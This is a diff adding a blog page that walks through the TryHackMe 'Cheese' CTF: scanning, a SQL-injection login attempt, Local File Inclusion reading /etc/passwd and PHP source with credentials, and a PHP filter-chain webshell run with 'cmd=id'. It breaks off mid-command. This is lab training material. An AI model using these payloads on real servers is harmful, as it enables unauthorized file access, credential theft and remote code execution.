@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Cheese | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="A TryHackMe boot-to-root CTF using port-spoofing triage, Local File Inclusion, PHP filter-chain execution, SSH key injection, systemd timer abuse, and a SUID file read.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/cheese.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="stylesheet" href="/assets/css/accents.css">
+<link rel="stylesheet" href="/assets/css/mobile-nav.css">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript><style>#theme-toggle,.top-link{display:none}</style></noscript>
+<script>
+if(localStorage.getItem("pref-theme")==="dark"){document.documentElement.dataset.theme="dark"}else if(localStorage.getItem("pref-theme")==="light"){document.documentElement.dataset.theme="light"}else if(window.matchMedia("(prefers-color-scheme: dark)").matches){document.documentElement.dataset.theme="dark"}else{document.documentElement.dataset.theme="light"}
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&amp;display=swap" rel="stylesheet">
+<meta property="og:url" content="https://jennshaggy.github.io/cheese.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Cheese">
+<meta property="og:description" content="A TryHackMe boot-to-root CTF using port-spoofing triage, Local File Inclusion, PHP filter-chain execution, SSH key injection, systemd timer abuse, and a SUID file read.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Cheese">
+<meta name="twitter:description" content="A TryHackMe boot-to-root CTF using port-spoofing triage, Local File Inclusion, PHP filter-chain execution, SSH key injection, systemd timer abuse, and a SUID file read.">
+</head>
+<body id="top">
+<header class="header">
+<nav class="nav">
+<div class="logo">
+<a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+<div class="logo-switches">
+<button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+<svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+<svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>
+</button>
+<button id="menu-toggle" type="button" aria-expanded="false" aria-controls="menu"><span class="menu-toggle-label">Menu</span><span class="menu-toggle-icon" aria-hidden="true"><span></span><span></span></span></button>
+</div>
+</div>
+<ul id="menu">
+<li><a href="/security-defense/" title="Security &amp; Defense"><span>Security &amp; Defense</span></a></li>
+<li><a href="/networking.html" title="Networking"><span>Networking</span></a></li>
+<li><a href="/systems-foundation.html" title="Systems"><span>Systems</span></a></li>
+<li><a href="/applied-projects.html" title="Penetration Testing"><span class="active">Penetration Testing</span></a></li>
+<li><a href="/platforms-training.html" title="Training"><span>Training</span></a></li>
+<li><a href="/ai-security/" title="AI Security"><span>AI Security</span></a></li>
+</ul>
+</nav>
+</header>
+<main class="main">
+<article class="post-single">
+<header class="post-header">
+<h1 class="post-title entry-hint-parent">Cheese</h1>
+<div class="post-description">A TryHackMe boot-to-root CTF using port-spoofing triage, Local File Inclusion, PHP filter-chain execution, SSH key injection, systemd timer abuse, and a SUID file read.</div>
+</header>
+<div class="post-content">
+<p><strong>Platform:</strong> TryHackMe<br />
+<strong>Type:</strong> Boot-to-root CTF<br />
+<strong>Techniques:</strong> Port spoofing, directory enumeration, Local File Inclusion, PHP source disclosure, PHP filter-chain RCE, SSH key injection, systemd timer abuse, SUID file read</p>
+<p>Cheese came in strong. The initial RustScan bombarded me with an endless slew of open ports. Every. Single. One. Glad I know to hit <code>CTRL</code> + <code>C</code> when the going gets tough.</p>
+<h2 id="every-port-is-open.-allegedly.">Every Port Is Open. Allegedly.</h2>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">rustscan</span> <span class="at">-a</span> <span class="st">&quot;</span><span class="va">$TARGET_IP</span><span class="st">&quot;</span> <span class="dt">\</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>--ulimit 5000 <span class="dt">\</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>--batch-size 1000 <span class="dt">\</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>--timeout 3000 <span class="dt">\</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>-- <span class="at">-Pn</span> <span class="at">-sC</span> <span class="at">-sV</span> <span class="at">-oN</span> cheese-initial.nmap</span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 8.32.48 PM.png" alt="RustScan reporting an endless slew of open ports" style="max-width:100%;margin:2rem 0;">
+<p>The output was endless. I cancelled RustScan and ran an Nmap scan narrowed to Ports 22, 80, 443, 8080, 8443, and 31337.</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">-Pn</span> <span class="at">-sV</span> <span class="at">--version-light</span> <span class="dt">\</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>-p 22,80,443,8080,8443,31337 <span class="dt">\</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;</span><span class="va">$TARGET_IP</span><span class="st">&quot;</span> <span class="dt">\</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>-oN cheese-sample.nmap</span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 8.34.35 PM.png" alt="Focused Nmap output showing several suspicious service banners" style="max-width:100%;margin:2rem 0;">
+<img src="/images/cheese/Screenshot 2026-09-03 at 8.34.51 PM.png" alt="Additional Nmap output showing unrelated service banners" style="max-width:100%;margin:2rem 0;">
+<p>Port 443 was pretending to be a McAfee gateway. Port 8080 spit out shell and Perl text. Port 8443 answered with unrelated binary-esque garbage. Port 31337 claimed to be an odd web server. Not sure I believe it.</p>
+<p>It’s port spoofing. No trustworthy banners here.</p>
+<p>Ports 22 and 80 do appear legitimate, though. That’s where this adventure really begins.</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">-Pn</span> <span class="at">-p22,80</span> <span class="at">-sC</span> <span class="at">-sV</span> <span class="dt">\</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;</span><span class="va">$TARGET_IP</span><span class="st">&quot;</span> <span class="dt">\</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>-oN cheese-focused.nmap</span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 8.37.05 PM.png" alt="Focused Nmap scan showing SSH on Port 22 and Apache on Port 80" style="max-width:100%;margin:2rem 0;">
+<h2 id="the-cheese-shop">The Cheese Shop</h2>
+<p>Awesome. We’ve separated the real services from the vegan cheese.</p>
+<p><strong>Port 22/SSH:</strong> Useful later if we unearth credentials or a private key.</p>
+<p><strong>Port 80/HTTP:</strong> The Cheese Shop, our best starting point.</p>
+<p>Let’s hit it in-browser.</p>
+<img src="/images/cheese/Screenshot 2026-09-03 at 8.38.51 PM.png" alt="The Cheese Shop homepage" style="max-width:100%;margin:2rem 0;">
+<p>The Cheese Shop has OWASP Juice Shop vibes. But with cheese.</p>
+<p>I spy a login endpoint at <code>/login.php</code>.</p>
+<img src="/images/cheese/Screenshot 2026-09-03 at 8.40.00 PM.png" alt="The Cheese Shop login page" style="max-width:100%;margin:2rem 0;">
+<p>We’ll try a SQLi login using:</p>
+<pre class="text"><code>Username: &#39; OR 1=1-- -
+Password: test</code></pre>
+<p>The Boolean payload didn’t work. It produced the same failed login <code>888 B</code> response. The basic SQL-injection bypass fell flat.</p>
+<h2 id="its-directory-enumeration-oclock">It’s Directory Enumeration O’Clock</h2>
+<p>We’ll check <code>robots.txt</code> first:</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-i</span> <span class="st">&quot;http://</span><span class="va">$TARGET_IP</span><span class="st">/robots.txt&quot;</span></span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 8.43.34 PM.png" alt="robots.txt returning a 404 response" style="max-width:100%;margin:2rem 0;">
+<p>Nothing in <code>robots.txt</code>, but we got a <code>404</code>.</p>
+<p>It’s directory enumeration o’clock:</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ffuf</span> <span class="dt">\</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>-w /usr/share/seclists/Discovery/Web-Content/common.txt <span class="dt">\</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>-u <span class="st">&quot;http://</span><span class="va">$TARGET_IP</span><span class="st">/FUZZ&quot;</span> <span class="dt">\</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>-e .php,.txt,.html,.bak <span class="dt">\</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>-mc 200,204,301,302,307,401,403 <span class="dt">\</span></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>-t 20</span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 8.47.35 PM.png" alt="ffuf discovering several web endpoints" style="max-width:100%;margin:2rem 0;">
+<p>These are the juicy findings:</p>
+<pre class="text"><code>/messages.html
+/orders.html
+/users.html
+/login.php
+/images/        &gt; redirect</code></pre>
+<p>Let’s dig into the first three:</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-sS</span> <span class="st">&quot;http://</span><span class="va">$TARGET_IP</span><span class="st">/users.html&quot;</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-sS</span> <span class="st">&quot;http://</span><span class="va">$TARGET_IP</span><span class="st">/orders.html&quot;</span></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-sS</span> <span class="st">&quot;http://</span><span class="va">$TARGET_IP</span><span class="st">/messages.html&quot;</span></span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 8.53.33 PM.png" alt="Contents of users.html" style="max-width:100%;margin:2rem 0;">
+<img src="/images/cheese/Screenshot 2026-09-03 at 8.53.52 PM.png" alt="Contents of orders.html" style="max-width:100%;margin:2rem 0;">
+<p>AHA! There it is in <code>/messages.html</code>:</p>
+<img src="/images/cheese/Screenshot 2026-09-03 at 8.54.17 PM.png" alt="messages.html exposing the secret-script.php file parameter" style="max-width:100%;margin:2rem 0;">
+<pre class="text"><code>secret-script.php?file=php://filter/resource=supersecretmessageforadmin</code></pre>
+<p><code>secret-script.php</code> accepts a <code>file</code> parameter, uses PHP’s <code>php://filter</code> stream wrapper, and requests the resource <code>supersecretmessageforadmin</code>.</p>
+<p>Beautiful.</p>
+<h2 id="reading-the-code-instead-of-running-it">Reading the Code Instead of Running It</h2>
+<p>We’ll run the link with URL encoding so the special characters don’t get mangled:</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-sS</span> <span class="at">--get</span> <span class="dt">\</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a>--data-urlencode <span class="st">&#39;file=php://filter/resource=supersecretmessageforadmin&#39;</span> <span class="dt">\</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;http://</span><span class="va">$TARGET_IP</span><span class="st">/secret-script.php&quot;</span></span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 8.56.54 PM.png" alt="The included resource responding with the message If you know you know" style="max-width:100%;margin:2rem 0;">
+<p>Wow. Touché.</p>
+<p>The file inclusion worked, but the message is winking at us: “If you know, you know.”</p>
+<p>We need to read the PHP source. Requesting <code>secret-script.php</code> normally would execute it. We can one-up them, though.</p>
+<p>The <code>convert.base64-encode</code> filter returns the source as Base64 instead:</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-sS</span> <span class="at">--get</span> <span class="dt">\</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a>--data-urlencode <span class="st">&#39;file=php://filter/convert.base64-encode/resource=secret-script.php&#39;</span> <span class="dt">\</span></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;http://</span><span class="va">$TARGET_IP</span><span class="st">/secret-script.php&quot;</span> <span class="kw">|</span> <span class="fu">base64</span> <span class="at">-d</span></span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 9.03.52 PM.png" alt="Decoded PHP source from secret-script.php" style="max-width:100%;margin:2rem 0;">
+<p>This is similar to reverse engineering: don’t interact with what the application displays. Find a way to inspect the code underneath.</p>
+<p>Here, the PHP filter Base64-encodes the server-side source. PHP returns it instead of executing it.</p>
+<p>Let’s remove <code>| base64 -d</code> and see exactly what the server sends back:</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-sS</span> <span class="at">--get</span> <span class="dt">\</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a>--data-urlencode <span class="st">&#39;file=php://filter/convert.base64-encode/resource=secret-script.php&#39;</span> <span class="dt">\</span></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;http://</span><span class="va">$TARGET_IP</span><span class="st">/secret-script.php&quot;</span></span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 9.16.59 PM.png" alt="Raw Base64 returned by the PHP filter" style="max-width:100%;margin:2rem 0;">
+<p>The Base64 decodes to:</p>
+<div class="sourceCode" id="cb13"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a>  <span class="co">//echo &quot;Hello World&quot;;</span></span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span>(<span class="kw">isset</span>(<span class="va">$_GET</span>[<span class="st">&#39;file&#39;</span>])) {</span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a>    <span class="va">$file</span> <span class="op">=</span> <span class="va">$_GET</span>[<span class="st">&#39;file&#39;</span>]<span class="ot">;</span></span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">include</span>(<span class="va">$file</span>)<span class="ot">;</span></span>
+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a><span class="kw">?&gt;</span></span></code></pre></div>
+<p>The vulnerable part is this:</p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="va">$file</span> <span class="op">=</span> <span class="va">$_GET</span>[<span class="st">&#39;file&#39;</span>]<span class="ot">;</span></span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="kw">include</span>(<span class="va">$file</span>)<span class="ot">;</span></span></code></pre></div>
+<p>That says, “Take whatever filename the visitor supplies and include it. No need to check if it is safe.”</p>
+<p>Confirmed: Local File Inclusion and support for PHP wrappers.</p>
+<h2 id="lets-find-the-users">Let’s Find the Users</h2>
+<p>First, let’s confirm regular ole’ local file reading:</p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-sS</span> <span class="at">--get</span> <span class="dt">\</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>--data-urlencode <span class="st">&#39;file=/etc/passwd&#39;</span> <span class="dt">\</span></span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;http://</span><span class="va">$TARGET_IP</span><span class="st">/secret-script.php&quot;</span> <span class="kw">|</span> <span class="fu">head</span></span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 9.21.35 PM.png" alt="The LFI reading the beginning of etc passwd" style="max-width:100%;margin:2rem 0;">
+<p>Oh yeah. <code>/etc/passwd</code> is there, meaning we’ve confirmed that the server will include arbitrary readable local files.</p>
+<p>Let’s use <code>/etc/passwd</code> for enumeration and look for accounts with interactive shells:</p>
+<div class="sourceCode" id="cb16"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-sS</span> <span class="at">--get</span> <span class="dt">\</span></span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a>--data-urlencode <span class="st">&#39;file=/etc/passwd&#39;</span> <span class="dt">\</span></span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;http://</span><span class="va">$TARGET_IP</span><span class="st">/secret-script.php&quot;</span> <span class="kw">|</span></span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="fu">grep</span> <span class="at">-E</span> <span class="st">&#39;/bin/(bash|sh)$&#39;</span></span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 9.23.48 PM.png" alt="Interactive shell accounts showing the comte user" style="max-width:100%;margin:2rem 0;">
+<p>OMG. Comté is a type of cheese. That is no accident.</p>
+<p>Let’s check the typical user-flag location through LFI:</p>
+<div class="sourceCode" id="cb17"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-sS</span> <span class="at">--get</span> <span class="dt">\</span></span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a>--data-urlencode <span class="st">&#39;file=/home/comte/user.txt&#39;</span> <span class="dt">\</span></span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;http://</span><span class="va">$TARGET_IP</span><span class="st">/secret-script.php&quot;</span></span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 9.26.42 PM.png" alt="Attempt to read the user flag through LFI" style="max-width:100%;margin:2rem 0;">
+<p><code>user.txt</code> is there, but Apache’s <code>www-data</code> account can’t read it.</p>
+<h2 id="logging-in-not-required">Logging In Not Required</h2>
+<p>Let’s try the source-disclosure technique on the login backend. We know <code>login.php</code> exists, and it just might show us how the login works. Maybe even credentials:</p>
+<div class="sourceCode" id="cb18"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-sS</span> <span class="at">--get</span> <span class="dt">\</span></span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a>--data-urlencode <span class="st">&#39;file=php://filter/convert.base64-encode/resource=login.php&#39;</span> <span class="dt">\</span></span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;http://</span><span class="va">$TARGET_IP</span><span class="st">/secret-script.php&quot;</span> <span class="kw">|</span> <span class="fu">base64</span> <span class="at">-d</span></span></code></pre></div>
+<p>What a treasure trove.</p>
+<p>We now have database credentials for <code>comte</code>.</p>
+<img src="/images/cheese/Screenshot 2026-09-03 at 9.29.47 PM.png" alt="Database credentials exposed in login.php source" style="max-width:100%;margin:2rem 0;">
+<p>We also see a SQL injection vuln. The username is inserted into the query without escaping.</p>
+<img src="/images/cheese/Screenshot 2026-09-03 at 9.30.42 PM.png" alt="Login source showing the SQL query and redirect behavior" style="max-width:100%;margin:2rem 0;">
+<p>Even better, a successful login doesn’t create an authenticated session. It redirects to:</p>
+<pre class="text"><code>secret-script.php?file=supersecretadminpanel.html</code></pre>
+<p>Guess what? We already control the <code>file</code> parameter. We don’t need to battle and win against the login form to view that file:</p>
+<div class="sourceCode" id="cb20"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-sS</span> <span class="at">--get</span> <span class="dt">\</span></span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a>--data-urlencode <span class="st">&#39;file=supersecretadminpanel.html&#39;</span> <span class="dt">\</span></span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;http://</span><span class="va">$TARGET_IP</span><span class="st">/secret-script.php&quot;</span></span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 9.32.51 PM.png" alt="The admin panel included without authentication" style="max-width:100%;margin:2rem 0;">
+<p>Hello, completely unauthenticated admin panel. Nice to pwn you.</p>
+<p>The shell looks mostly decorative. The three links point to the same empty pages we already inspected.</p>
+<p>BUT! We have an exposed credential pair.</p>
+<p>Let’s pwn Comté:</p>
+<div class="sourceCode" id="cb21"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ssh</span> comte@<span class="st">&quot;</span><span class="va">$TARGET_IP</span><span class="st">&quot;</span></span></code></pre></div>
+<p>Nope. SSH won’t take the password. It’s not a reused credential.</p>
+<p>That’s okay.</p>
+<h2 id="from-lfi-to-rce">From LFI to RCE</h2>
+<p>Our LFI uses PHP’s <code>include()</code>, so we’ll test whether it can include PHP code passed through the request body:</p>
+<div class="sourceCode" id="cb22"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-sS</span> <span class="at">-X</span> POST <span class="dt">\</span></span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a>--data-binary <span class="st">&#39;&lt;?php system(&quot;id&quot;); ?&gt;&#39;</span> <span class="dt">\</span></span>
+<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;http://</span><span class="va">$TARGET_IP</span><span class="st">/secret-script.php?file=php%3A%2F%2Finput&quot;</span></span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 9.38.40 PM.png" alt="Attempt to execute PHP through php input" style="max-width:100%;margin:2rem 0;">
+<p>No output. That route didn’t work.</p>
+<p>We’ll use a filter-chain generator with a little help from automation scripts. The chain uses PHP conversion filters to create our PHP payload inside <code>php://temp</code>, which is then executed by <code>include()</code>.</p>
+<p>Here’s the GitHub repo:</p>
+<p>https://github.com/synacktiv/php_filter_chain_generator</p>
+<p>First, clone the generator:</p>
+<div class="sourceCode" id="cb23"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ~/Downloads</span>
+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/synacktiv/php_filter_chain_generator.git</span>
+<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> php_filter_chain_generator</span></code></pre></div>
+<p>Next, generate a command-execution chain and store it in a shell variable:</p>
+<div class="sourceCode" id="cb24"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="va">CHAIN</span><span class="op">=</span><span class="va">$(</span><span class="ex">python3</span> php_filter_chain_generator.py <span class="dt">\</span></span>
+<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a>--chain <span class="st">&#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;</span> <span class="kw">|</span></span>
+<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a><span class="fu">tail</span> <span class="at">-n</span> 1<span class="va">)</span></span></code></pre></div>
+<p>Test it with the innocent old <code>id</code> command:</p>
+<div class="sourceCode" id="cb25"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-sS</span> <span class="at">--get</span> <span class="dt">\</span></span>
+<span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a>--data-urlencode <span class="st">&quot;file=</span><span class="va">$CHAIN</span><span class="st">&quot;</span> <span class="dt">\</span></span>
+<span id="cb25-3"><a href="#cb25-3" aria-hidden="true" tabindex="-1"></a>--data-urlencode <span class="st">&#39;cmd=id&#39;</span> <span class="dt">\</span></span>
+<span id="cb25-4"><a href="#cb25-4" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;http://</span><span class="va">$TARGET_IP</span><span class="st">/secret-script.php&quot;</span></span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 9.46.52 PM.png" alt="Initial PHP filter-chain execution attempt" style="max-width:100%;margin:2rem 0;">
+<p>That gave us nothing useful.</p>
+<p>Let’s try this hot little number:</p>
+<div class="sourceCode" id="cb26"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="bu">printf</span> <span class="st">&#39;Chain length: %s\n&#39;</span> <span class="st">&quot;</span><span class="va">${</span><span class="op">#</span><span class="va">CHAIN}</span><span class="st">&quot;</span></span>
+<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-sS</span> <span class="at">-o</span> /tmp/chain-response <span class="dt">\</span></span>
+<span id="cb26-4"><a href="#cb26-4" aria-hidden="true" tabindex="-1"></a>-w <span class="st">&#39;HTTP status: %{http_code}\nResponse bytes: %{size_download}\n&#39;</span> <span class="dt">\</span></span>
+<span id="cb26-5"><a href="#cb26-5" aria-hidden="true" tabindex="-1"></a>--get <span class="dt">\</span></span>
+<span id="cb26-6"><a href="#cb26-6" aria-hidden="true" tabindex="-1"></a>--data-urlencode <span class="st">&quot;file=</span><span class="va">$CHAIN</span><span class="st">&quot;</span> <span class="dt">\</span></span>
+<span id="cb26-7"><a href="#cb26-7" aria-hidden="true" tabindex="-1"></a>--data-urlencode <span class="st">&#39;cmd=id&#39;</span> <span class="dt">\</span></span>
